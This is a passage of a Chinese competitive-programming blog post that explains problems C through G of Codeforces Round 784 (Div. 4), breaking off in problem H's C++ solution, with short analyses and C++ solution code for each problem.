class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;().<span class="built_in">swap</span>(ma);</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        cin&gt;&gt;x;</span><br><span class="line">        <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">            ma[x]++;</span><br><span class="line">            <span class="keyword">if</span>(ma[x]==<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,x);</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Odd-Even-Increments"><a href="#C-Odd-Even-Increments" class="headerlink" title="C. Odd/Even Increments"></a>C. Odd/Even Increments</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>偶数位置或者奇数位置同时+1，问能否达到全奇数或者全偶数的状态，直接判断奇数位置上是否全为奇数或者全为偶数和偶数位置上是否全为奇数或者全为偶数即可。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]%<span class="number">2</span>!=a[i<span class="number">-2</span>]%<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">4</span>;i&lt;=n;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]%<span class="number">2</span>!=a[i<span class="number">-2</span>]%<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Colorful-Stamp"><a href="#D-Colorful-Stamp" class="headerlink" title="D. Colorful Stamp"></a>D. Colorful Stamp</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>有一个长度为2的红蓝印章，每次打印上去可以使相邻两个格子的颜色一个为红，一个为蓝，颜色可以覆盖。那么格子将出现三种状态：白，红，蓝。我们以白色方格作为分割，容易发现不可能存在长度为1的红色或者蓝色色块，所以只有一个格子的时候那个格子必为白色，不可能是红色或者蓝色。对于一个连续的色块，可以发现必须同时存在蓝色和红色。因此只要所有的连续色块满足这个要求就可以啦。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[<span class="number">0</span>]==<span class="string">&#x27;W&#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    s[n++]=<span class="string">&#x27;W&#x27;</span>;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>,len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;W&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(len==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(len&gt;<span class="number">1</span>&amp;&amp;flag!=<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            len=<span class="number">0</span>;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            len++;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;R&#x27;</span>)&#123;</span><br><span class="line">                flag|=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;B&#x27;</span>)&#123;</span><br><span class="line">                flag|=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-2-Letter-Strings"><a href="#E-2-Letter-Strings" class="headerlink" title="E. 2-Letter Strings"></a>E. 2-Letter Strings</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/5.png" alt="5"></p><h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定若干个长度只有2的字符串，要求输出符合要求的对数，要求为两对字符串有且仅有1个位置字符不一样。由于数据点较小，我们很容易想到把字符串转int类型比较，由于字符只有11种，理论上可以一个char压缩字符串，但是我选择用short进行，因为复杂度绰绰有余。</p><p>然后对于转换成的整数类型进行比较，若发现高位或者低位相同，则将答案加上 $num[i]*num[j]$，题目已经提示long long，其它的也没啥了。</p><h3 id="标程-4"><a href="#标程-4" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">3000</span>;</span><br><span class="line"><span class="keyword">int</span> a[N+<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">5</span>];</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">        a[((s[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>)&lt;&lt;<span class="number">8</span>)|(s[<span class="number">1</span>]-<span class="string">&#x27;a&#x27;</span>)]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=N;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>( (i&amp;<span class="number">0x0000ff00</span>)==(j&amp;<span class="number">0x0000ff00</span>)||(i&amp;<span class="number">0x000000ff</span>)==(j&amp;<span class="number">0x000000ff</span>) )&#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]&amp;&amp;a[j])&#123;</span><br><span class="line">                    ans+=<span class="number">1ll</span>*a[i]*a[j];</span><br><span class="line">                    <span class="comment">//printf(&quot;0x%x 0x%x\n&quot;,i,j);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,a[0x101]);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-Eating-Candies"><a href="#F-Eating-Candies" class="headerlink" title="F. Eating Candies"></a>F. Eating Candies</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/6.png" alt="6"></p><h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是一个人只能从左吃，另一个人只能从右开始吃，问最后吃的重量一样的情况下的最多糖果。这个直接贪心好了，如果左边人少了那就左边的人吃，否则右边的人吃，一旦重量一样了保存结果，最后输出即可。</p><h3 id="标程-5"><a href="#标程-5" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">2e5</span>;</span><br><span class="line"><span class="keyword">int</span> w[N+<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;w[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>,j=n;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=j)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a==b)&#123;</span><br><span class="line">            ans=i<span class="number">-1</span>+n-j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a&lt;b)&#123;</span><br><span class="line">            a+=w[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            b+=w[j];</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,i,j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a==b)ans=n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="G-Fall-Down"><a href="#G-Fall-Down" class="headerlink" title="G. Fall Down"></a>G. Fall Down</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/7.png" alt="7"></p><h3 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h3><p>模拟题，直接按要求下落石块就行，注意判断一下下落条件即可。</p><h3 id="标程-6"><a href="#标程-6" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">55</span>][<span class="number">55</span>];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fall</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="comment">//a[y++][x];</span></span><br><span class="line">    <span class="keyword">while</span>(y!=n&amp;&amp;a[y+<span class="number">1</span>][x]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">        a[y][x]=<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        y++;</span><br><span class="line">        a[y][x]=<span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            a[i][j]=s[j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i][j]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">fall</span>(j,i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="H-Maximal-AND"><a href="#H-Maximal-AND" class="headerlink" title="H. Maximal AND"></a>H. Maximal AND</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/8.png" alt="8"></p><h3 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h3><p>有k次机会让某一个数的二进制位变成1，最后求所有数的与最大值。我们直接统计所有位的情况，从最高位开始，如果当前k的值允许变为全1则直接给了，然后答案加上那一位即可。</p><h3 id="标程-7"><a href="#标程-7" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span 